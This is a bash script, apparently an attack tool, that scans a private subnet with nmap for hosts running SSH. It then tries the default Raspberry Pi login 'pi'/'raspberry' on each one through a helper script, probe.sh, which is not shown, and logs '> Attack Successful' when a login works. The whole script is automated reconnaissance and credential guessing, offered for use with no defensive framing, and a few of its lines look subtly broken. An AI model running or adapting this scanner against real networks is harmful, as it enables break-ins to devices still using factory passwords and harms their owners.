#!/bin/bash
RED='\033[0;31m'
LGREY='\033[0;37m'
DIM='\033[0;2m'
BOLD='\033[0;1m'
RBOLD='\033[0;21m'
CLEAR='\033[0;0m'


main() {
	alert "Starting Up"
	scan
	alert "Goodbye"
}

function scan() {
	command="nmap -p 22 -oG - -sV 10.1.63.0-255 | grep -op 'Host:.*ssh.*'
		| awk '{print \$2}'"

	# Remember to add `--open` to the above command to filter
	
	log $command
	target_list=$(eval $command)
	target_list=$'\n' read -rd '' -a y <<<"$target_list"

	for ip in $target_list
	do
		probe $ip
	done
}

function probe() {
	log "Probing $1"
	./probe.sh pi $1 raspberry > /dev/null 2>&1
	case "$?" in 
		0) log "> Attack Successful";;
		1) log "> Network timeout";;
		2) log "> Could not determine password";;
		*) alert "Unknown error occured while probing.  Code: $?";;
	esac
}
	
timestamp() {
	date +"%T"
}	
		
function printMessage() {
	printf "$@\n"
}

function alert() {
	printMessage "${RED}$@${CLEAR}"
}

function log() {
	printMessage "${DIM}${LGREY}# ${BOLD}LOG $(timestamp) |${RBOLD} $@${CLEAR}"
}

main "$@"

